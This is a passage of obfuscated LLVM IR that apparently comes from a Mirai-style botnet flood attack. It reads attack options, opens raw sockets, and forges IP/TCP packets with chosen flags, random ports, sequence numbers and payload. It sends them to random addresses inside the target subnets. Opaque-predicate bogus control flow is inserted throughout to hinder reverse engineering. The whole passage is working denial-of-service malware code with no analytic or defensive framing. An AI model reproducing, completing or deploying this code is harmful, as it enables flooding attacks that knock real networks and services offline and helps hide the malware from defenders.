  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 0)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  %169 = icmp ne i8** %168, null
  br i1 %169, label %187, label %170

; <label>:170:                                    ; preds = %1
  %171 = load i32, i32* @x.27
  %172 = load i32, i32* @y.28
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %170
  call void @exit(i32 1) #10
  %179 = load i32, i32* @x.27
  %180 = load i32, i32* @y.28
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:187:                                    ; preds = %1
  %188 = load i32, i32* @x.27
  %189 = load i32, i32* @y.28
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %187
  %196 = load %struct.arguments*, %struct.arguments** %2, align 8
  %197 = getelementptr inbounds %struct.arguments, %struct.arguments* %196, i32 0, i32 3
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i64
  %200 = call noalias i8* @calloc(i64 %199, i64 4) #8
  %201 = bitcast i8* %200 to i32*
  store i32* %201, i32** %22, align 8
  %202 = load i32*, i32** %22, align 8
  %203 = icmp ne i32* %202, null
  %204 = load i32, i32* @x.27
  %205 = load i32, i32* @y.28
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %203, label %213, label %212

; <label>:212:                                    ; preds = %originalBBpart24
  call void @exit(i32 1) #10
  unreachable

; <label>:213:                                    ; preds = %originalBBpart24
  %214 = load i32, i32* @x.27
  %215 = load i32, i32* @y.28
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %213
  store i32 0, i32* %3, align 4
  %222 = load i32, i32* @x.27
  %223 = load i32, i32* @y.28
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %230

; <label>:230:                                    ; preds = %521, %originalBBpart28
  %231 = load i32, i32* %3, align 4
  %232 = load %struct.arguments*, %struct.arguments** %2, align 8
  %233 = getelementptr inbounds %struct.arguments, %struct.arguments* %232, i32 0, i32 3
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp slt i32 %231, %235
  br i1 %236, label %237, label %524

; <label>:237:                                    ; preds = %230
  %238 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %239 = load i32*, i32** %22, align 8
  %240 = load i32, i32* %3, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds i32, i32* %239, i64 %241
  store i32 %238, i32* %242, align 4
  %243 = load i32*, i32** %22, align 8
  %244 = load i32, i32* %3, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds i32, i32* %243, i64 %245
  %247 = load i32, i32* %246, align 4
  %248 = icmp eq i32 %247, -1
  br i1 %248, label %249, label %268

; <label>:249:                                    ; preds = %237
  %250 = load i32, i32* @x.27
  %251 = load i32, i32* @y.28
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %249
  %258 = load i8**, i8*** %9, align 8
  %259 = bitcast i8** %258 to i8*
  call void @free(i8* %259) #8
  call void @exit(i32 1) #10
  %260 = load i32, i32* @x.27
  %261 = load i32, i32* @y.28
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:268:                                    ; preds = %237
  store i32 1, i32* %4, align 4
  %269 = load i32*, i32** %22, align 8
  %270 = load i32, i32* %3, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds i32, i32* %269, i64 %271
  %273 = load i32, i32* %272, align 4
  %274 = bitcast i32* %4 to i8*
  %275 = call i32 @setsockopt(i32 %273, i32 0, i32 3, i8* %274, i32 4) #8
  %276 = icmp eq i32 %275, -1
  br i1 %276, label %277, label %280

; <label>:277:                                    ; preds = %268
  %278 = load i8**, i8*** %9, align 8
  %279 = bitcast i8** %278 to i8*
  call void @free(i8* %279) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:280:                                    ; preds = %268
  %281 = load i32, i32* @x.27
  %282 = load i32, i32* @y.28
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %280
  %289 = load i32, i32* %23, align 4
  %290 = icmp ne i32 %289, 0
  %291 = load i32, i32* @x.27
  %292 = load i32, i32* @y.28
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %290, label %299, label %334

; <label>:299:                                    ; preds = %originalBBpart216
  %300 = load i32, i32* @x.27
  %301 = load i32, i32* @y.28
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %299
  %308 = load i16, i16* %6, align 2
  %309 = load i32*, i32** %22, align 8
  %310 = load i32, i32* %3, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i32, i32* %309, i64 %311
  %313 = load i32, i32* %312, align 4
  %314 = load %struct.arguments*, %struct.arguments** %2, align 8
  %315 = getelementptr inbounds %struct.arguments, %struct.arguments* %314, i32 0, i32 0
  %316 = load %struct.target*, %struct.target** %315, align 8
  %317 = load i32, i32* %3, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.target, %struct.target* %316, i64 %318
  %320 = getelementptr inbounds %struct.target, %struct.target* %319, i32 0, i32 0
  %321 = load i32, i32* %320, align 4
  %322 = load i32, i32* %19, align 4
  %323 = load i16, i16* %8, align 2
  %324 = zext i16 %323 to i32
  %325 = call i32 @tcp_handshake(i16 zeroext %308, i32 %313, i32 %321, i32 %322, i32 %324)
  %326 = load i32, i32* @x.27
  %327 = load i32, i32* @y.28
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %334

; <label>:334:                                    ; preds = %originalBBpart220, %originalBBpart216
  %335 = load i16, i16* %5, align 2
  %336 = zext i16 %335 to i32
  %337 = add nsw i32 %336, 110
  %338 = sext i32 %337 to i64
  %339 = call noalias i8* @malloc(i64 %338) #8
  %340 = load i8**, i8*** %9, align 8
  %341 = load i32, i32* %3, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds i8*, i8** %340, i64 %342
  store i8* %339, i8** %343, align 8
  %344 = load i8**, i8*** %9, align 8
  %345 = load i32, i32* %3, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds i8*, i8** %344, i64 %346
  %348 = load i8*, i8** %347, align 8
  %349 = icmp ne i8* %348, null
  br i1 %349, label %353, label %350

; <label>:350:                                    ; preds = %334
  %351 = load i8**, i8*** %9, align 8
  %352 = bitcast i8** %351 to i8*
  call void @free(i8* %352) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:353:                                    ; preds = %334
  %354 = load i8**, i8*** %9, align 8
  %355 = load i32, i32* %3, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds i8*, i8** %354, i64 %356
  %358 = load i8*, i8** %357, align 8
  %359 = bitcast i8* %358 to %struct.iphdr*
  store %struct.iphdr* %359, %struct.iphdr** %24, align 8
  %360 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %361 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %360, i64 1
  %362 = bitcast %struct.iphdr* %361 to %struct.tcphdr*
  store %struct.tcphdr* %362, %struct.tcphdr** %25, align 8
  %363 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %364 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %363, i64 1
  %365 = bitcast %struct.tcphdr* %364 to i8*
  store i8* %365, i8** %26, align 8
  %366 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %367 = bitcast %struct.iphdr* %366 to i8*
  %368 = load i8, i8* %367, align 4
  %369 = and i8 %368, 15
  %370 = or i8 %369, 64
  store i8 %370, i8* %367, align 4
  %371 = load i8, i8* %16, align 1
  %372 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 1
  store i8 %371, i8* %373, align 1
  %374 = load i16, i16* %5, align 2
  %375 = zext i16 %374 to i64
  %376 = add i64 40, %375
  %377 = trunc i64 %376 to i16
  %378 = call zeroext i16 @htons(i16 zeroext %377) #9
  %379 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 2
  store i16 %378, i16* %380, align 2
  %381 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %382 = bitcast %struct.iphdr* %381 to i8*
  %383 = load i8, i8* %382, align 4
  %384 = and i8 %383, -16
  %385 = or i8 %384, 5
  store i8 %385, i8* %382, align 4
  %386 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 4
  store i16 0, i16* %387, align 2
  %388 = load i8, i8* %7, align 1
  %389 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 5
  store i8 %388, i8* %390, align 4
  %391 = load i16, i16* %17, align 2
  %392 = call zeroext i16 @htons(i16 zeroext %391) #9
  %393 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 3
  store i16 %392, i16* %394, align 4
  %395 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 6
  store i8 6, i8* %396, align 1
  %397 = load i32, i32* %19, align 4
  %398 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 8
  store i32 %397, i32* %399, align 4
  %400 = load %struct.arguments*, %struct.arguments** %2, align 8
  %401 = getelementptr inbounds %struct.arguments, %struct.arguments* %400, i32 0, i32 0
  %402 = load %struct.target*, %struct.target** %401, align 8
  %403 = load i32, i32* %3, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.target, %struct.target* %402, i64 %404
  %406 = getelementptr inbounds %struct.target, %struct.target* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 4
  %408 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 9
  store i32 %407, i32* %409, align 4
  %410 = load i16, i16* %6, align 2
  %411 = call zeroext i16 @htons(i16 zeroext %410) #9
  %412 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon* %413 to %struct.anon.0*
  %415 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %414, i32 0, i32 1
  store i16 %411, i16* %415, align 2
  %416 = load i16, i16* %8, align 2
  %417 = call zeroext i16 @htons(i16 zeroext %416) #9
  %418 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon* %419 to %struct.anon.0*
  %421 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %420, i32 0, i32 0
  store i16 %417, i16* %421, align 4
  %422 = load i32, i32* %18, align 4
  %423 = trunc i32 %422 to i16
  %424 = call zeroext i16 @htons(i16 zeroext %423) #9
  %425 = zext i16 %424 to i32
  %426 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 0
  %428 = bitcast %union.anon* %427 to %struct.anon.0*
  %429 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %428, i32 0, i32 2
  store i32 %425, i32* %429, align 4
  %430 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 0
  %432 = bitcast %union.anon* %431 to %struct.anon.0*
  %433 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %432, i32 0, i32 4
  %434 = load i16, i16* %433, align 4
  %435 = and i16 %434, -241
  %436 = or i16 %435, 80
  store i16 %436, i16* %433, align 4
  %437 = load i8, i8* %10, align 1
  %438 = sext i8 %437 to i16
  %439 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %440 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %439, i32 0, i32 0
  %441 = bitcast %union.anon* %440 to %struct.anon.0*
  %442 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %441, i32 0, i32 4
  %443 = load i16, i16* %442, align 4
  %444 = and i16 %438, 1
  %445 = shl i16 %444, 12
  %446 = and i16 %443, -4097
  %447 = or i16 %446, %445
  store i16 %447, i16* %442, align 4
  %448 = load i8, i8* %11, align 1
  %449 = sext i8 %448 to i16
  %450 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %451 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %450, i32 0, i32 0
  %452 = bitcast %union.anon* %451 to %struct.anon.0*
  %453 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %452, i32 0, i32 4
  %454 = load i16, i16* %453, align 4
  %455 = and i16 %449, 1
  %456 = shl i16 %455, 8
  %457 = and i16 %454, -257
  %458 = or i16 %457, %456
  store i16 %458, i16* %453, align 4
  %459 = load i8, i8* %12, align 1
  %460 = sext i8 %459 to i16
  %461 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 0
  %463 = bitcast %union.anon* %462 to %struct.anon.0*
  %464 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %463, i32 0, i32 4
  %465 = load i16, i16* %464, align 4
  %466 = and i16 %460, 1
  %467 = shl i16 %466, 13
  %468 = and i16 %465, -8193
  %469 = or i16 %468, %467
  store i16 %469, i16* %464, align 4
  %470 = load i8, i8* %13, align 1
  %471 = sext i8 %470 to i16
  %472 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 0
  %474 = bitcast %union.anon* %473 to %struct.anon.0*
  %475 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = and i16 %471, 1
  %478 = shl i16 %477, 11
  %479 = and i16 %476, -2049
  %480 = or i16 %479, %478
  store i16 %480, i16* %475, align 4
  %481 = load i8, i8* %14, align 1
  %482 = sext i8 %481 to i16
  %483 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 0
  %485 = bitcast %union.anon* %484 to %struct.anon.0*
  %486 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %485, i32 0, i32 4
  %487 = load i16, i16* %486, align 4
  %488 = and i16 %482, 1
  %489 = shl i16 %488, 10
  %490 = and i16 %487, -1025
  %491 = or i16 %490, %489
  store i16 %491, i16* %486, align 4
  %492 = load i8, i8* %15, align 1
  %493 = sext i8 %492 to i16
  %494 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 0
  %496 = bitcast %union.anon* %495 to %struct.anon.0*
  %497 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %496, i32 0, i32 4
  %498 = load i16, i16* %497, align 4
  %499 = and i16 %493, 1
  %500 = shl i16 %499, 9
  %501 = and i16 %498, -513
  %502 = or i16 %501, %500
  store i16 %502, i16* %497, align 4
  %503 = call i32 @rand_new()
  %504 = and i32 %503, 65535
  %505 = trunc i32 %504 to i16
  %506 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 0
  %508 = bitcast %union.anon* %507 to %struct.anon.0*
  %509 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %508, i32 0, i32 5
  store i16 %505, i16* %509, align 2
  %510 = load i32, i32* %20, align 4
  %511 = trunc i32 %510 to i16
  %512 = call zeroext i16 @htons(i16 zeroext %511) #9
  %513 = zext i16 %512 to i32
  %514 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 0
  %516 = bitcast %union.anon* %515 to %struct.anon.0*
  %517 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %516, i32 0, i32 3
  store i32 %513, i32* %517, align 4
  %518 = load i8*, i8** %26, align 8
  %519 = load i16, i16* %5, align 2
  %520 = zext i16 %519 to i32
  call void @rand_string(i8* %518, i32 %520)
  br label %521

; <label>:521:                                    ; preds = %353
  %522 = load i32, i32* %3, align 4
  %523 = add nsw i32 %522, 1
  store i32 %523, i32* %3, align 4
  br label %230

; <label>:524:                                    ; preds = %230
  br label %525

; <label>:525:                                    ; preds = %764, %524
  store i32 0, i32* %3, align 4
  br label %526

; <label>:526:                                    ; preds = %761, %525
  %527 = load i32, i32* %3, align 4
  %528 = load %struct.arguments*, %struct.arguments** %2, align 8
  %529 = getelementptr inbounds %struct.arguments, %struct.arguments* %528, i32 0, i32 3
  %530 = load i8, i8* %529, align 1
  %531 = zext i8 %530 to i32
  %532 = icmp slt i32 %527, %531
  br i1 %532, label %533, label %764

; <label>:533:                                    ; preds = %526
  %534 = load i32, i32* @x.27
  %535 = load i32, i32* @y.28
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %533
  %542 = load i8**, i8*** %9, align 8
  %543 = load i32, i32* %3, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds i8*, i8** %542, i64 %544
  %546 = load i8*, i8** %545, align 8
  %547 = bitcast i8* %546 to %struct.iphdr*
  store %struct.iphdr* %547, %struct.iphdr** %27, align 8
  %548 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i64 1
  %550 = bitcast %struct.iphdr* %549 to %struct.tcphdr*
  store %struct.tcphdr* %550, %struct.tcphdr** %28, align 8
  %551 = load %struct.arguments*, %struct.arguments** %2, align 8
  %552 = getelementptr inbounds %struct.arguments, %struct.arguments* %551, i32 0, i32 0
  %553 = load %struct.target*, %struct.target** %552, align 8
  %554 = load i32, i32* %3, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.target, %struct.target* %553, i64 %555
  %557 = getelementptr inbounds %struct.target, %struct.target* %556, i32 0, i32 1
  %558 = load i16, i16* %557, align 4
  %559 = zext i16 %558 to i32
  %560 = icmp slt i32 %559, 32
  %561 = load i32, i32* @x.27
  %562 = load i32, i32* @y.28
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %560, label %569, label %589

; <label>:569:                                    ; preds = %originalBBpart224
  %570 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %571 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %570, i32 0, i32 9
  %572 = load i32, i32* %571, align 4
  %573 = call i32 @ntohl(i32 %572) #9
  %574 = call i32 @rand_new()
  %575 = load %struct.arguments*, %struct.arguments** %2, align 8
  %576 = getelementptr inbounds %struct.arguments, %struct.arguments* %575, i32 0, i32 0
  %577 = load %struct.target*, %struct.target** %576, align 8
  %578 = load i32, i32* %3, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.target, %struct.target* %577, i64 %579
  %581 = getelementptr inbounds %struct.target, %struct.target* %580, i32 0, i32 1
  %582 = load i16, i16* %581, align 4
  %583 = zext i16 %582 to i32
  %584 = lshr i32 %574, %583
  %585 = add i32 %573, %584
  %586 = call i32 @htonl(i32 %585) #9
  %587 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %588 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %587, i32 0, i32 9
  store i32 %586, i32* %588, align 4
  br label %589

; <label>:589:                                    ; preds = %569, %originalBBpart224
  %590 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 8
  %592 = load i32, i32* %591, align 4
  %593 = icmp eq i32 %592, -1
  br i1 %593, label %594, label %598

; <label>:594:                                    ; preds = %589
